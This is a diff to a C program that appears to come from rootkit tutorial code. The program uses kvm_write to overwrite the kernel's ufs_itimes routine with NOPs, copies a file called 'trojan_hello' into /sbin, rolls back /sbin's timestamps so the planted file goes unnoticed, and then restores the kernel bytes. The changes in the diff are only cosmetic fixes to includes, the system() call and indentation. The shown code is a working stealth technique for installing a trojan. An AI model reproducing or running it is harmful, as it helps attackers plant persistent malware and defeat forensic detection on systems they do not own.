@@ -1,20 +1,23 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <kvm.h>
-#include <limits.h>
 #include <nlist.h>
+#include <limits.h>
 #include <stdio.h>
+#include <stdlib.h>
+//#include <sys/libkern.h>
+//#include <sys/sysproto.h>
 #include <sys/time.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+//#include <sys/sysproto.h>
 #define SIZE 450
 #define T_NAME "trojan_hello"
 #define DESTINATION "/sbin/."
 /* Replacement code. */
 unsigned char nop_code[] =
 "\x90\x90\x90"; /* nop */
-int
-main(int argc, char *argv[])
+int main(int argc, char *argv[])
 {
     int i, offset1, offset2;
     char errbuf[_POSIX2_LINE_MAX];
@@ -71,20 +74,20 @@ main(int argc, char *argv[])
      }
     if (kvm_write(kd, nl[0].n_value + offset2, nop_code, sizeof(nop_code) - 1) < 0) {
         fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
-        exit(-1);
+       exit(-1);
     }
     /* Copy T_NAME into DESTINATION. */
     char string[] = "cp" " " T_NAME " " DESTINATION;
-    system(&string);
+    system(string);
 /* Roll back /sbin/'s access and modification times. */
     if (utimes("/sbin", (struct timeval *)&time) < 0) {
-        fprintf(stderr, "UTIMES ERROR: %d\n", errno);
-        exit(-1);
+       fprintf(stderr, "UTIMES ERROR: %d\n", errno);
+       exit(-1);
     }
 /* Restore ufs_itimes. */
     if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1], sizeof(nop_code) - 1) < 0) {
         fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
-        exit(-1);
+       exit(-1);
      }
     if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
         sizeof(nop_code) - 1) < 0) {
